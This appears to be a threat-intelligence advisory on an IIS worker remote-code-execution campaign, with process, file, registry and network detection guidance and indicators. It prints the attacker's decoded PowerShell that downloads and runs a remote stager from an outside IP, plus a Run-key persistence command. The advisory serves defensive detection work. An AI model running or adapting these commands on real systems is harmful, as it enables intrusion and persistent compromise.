# Project Cobalt Thread — In-the-Wild IIS Worker RCE

**Date:** 2026-08-18
**Severity:** Critical
**CVE:** CVE-2026-44011
**CVSS 3.1:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
**Vendor / product:** Microsoft Internet Information Services (IIS) 10 on Windows Server 2019 and 2022
**Reported by:** Nimbus Range (threat actor tracked as UNC-THREAD)
**MITRE ATT&CK:** T1190 Exploit Public-Facing Application, T1059.001 PowerShell, T1059.003 Windows Command Shell, T1547.001 Registry Run Keys, T1105 Ingress Tool Transfer

## Summary

Nimbus Range is exploiting a pre-auth deserialization bug in a custom IIS native module (`nativelib.dll`) shipped with a popular third-party WAF plugin. Successful exploitation gives code execution **inside `w3wp.exe`**, after which the actor drops a stager and persists via a Run key.

This is not a hash-chasing problem. The reliable detections are the **process tree**, **file drops under the IIS temporary directory**, and **registry persistence**.

## Exploitation

1. Attacker sends a malformed HTTP POST to `/_waf/health` with a crafted `X-WAF-State` header.
2. `nativelib.dll` deserializes the header using a vulnerable BinaryFormatter clone.
3. Shellcode runs in the IIS worker (`w3wp.exe`).
4. The worker spawns a hidden command shell, then PowerShell.

Observed parent-child chain:

```
w3wp.exe
  └─ cmd.exe /c powershell.exe -NoP -NonI -W Hidden -Enc <base64>
        └─ powershell.exe  (decoded: download cradle + file write)
```

Decoded PowerShell (whitespace normalized):

```
powershell.exe -NoP -NonI -W Hidden -Command
  IEX (New-Object Net.WebClient).DownloadString('http://185.244.214.77/stager.ps1');
  [IO.File]::WriteAllBytes('C:\Windows\Temp\IIS Temporary Compressed Files\cobb.dll', $buf)
```

## Host telemetry

### Process creation — Sysmon Event ID 1 / Security Event ID 4688

- **ParentImage** ends with `\w3wp.exe`
- **Image** ends with `\cmd.exe` or `\powershell.exe`
- **CommandLine** contains `-Enc` or `DownloadString` or `IIS Temporary Compressed Files`

### File create — Sysmon Event ID 11

- **TargetFilename** contains `\IIS Temporary Compressed Files\`
- **Image** is `\w3wp.exe` or `\powershell.exe`
- Dropped payload name observed: `cobb.dll`

### Registry — Sysmon Event ID 13

Persistence:

- **TargetObject:** `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\IISHealthCheck`
- **Details:** `rundll32.exe C:\Windows\Temp\IIS Temporary Compressed Files\cobb.dll,Start`

### Network — Sysmon Event ID 3

- **DestinationIp:** `185.244.214.77`
- **DestinationPort:** `80`
- **Image:** `\powershell.exe`

## Linux note

The same actor has a separate nginx Lua gadget on Debian. That path is **not** in scope for this advisory. Do not alert on `nginx` spawning `/bin/bash` from this write-up alone.

## Indicators (supporting, not primary)

| Type | Value |
| --- | --- |
| IPv4 | 185.244.214.77 |
| URL | http://185.244.214.77/stager.ps1 |
| SHA256 | 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08 |
| Path | C:\Windows\Temp\IIS Temporary Compressed Files\cobb.dll |

## Detection guidance

A high-fidelity Sigma rule should fire when an IIS worker (`w3wp.exe`) creates `cmd.exe` or `powershell.exe`, especially when the command line contains encoded PowerShell or a download cradle. Pair with a file-create hunt under the IIS temporary compressed files directory. Expected false positives: rare IIS reset scripts launched by administrators from an elevated prompt — not from `w3wp.exe`.

## References

- Internal tracker: Nimbus Range / UNC-THREAD
- Patch: disable the third-party WAF native module until vendor build 6.4.9
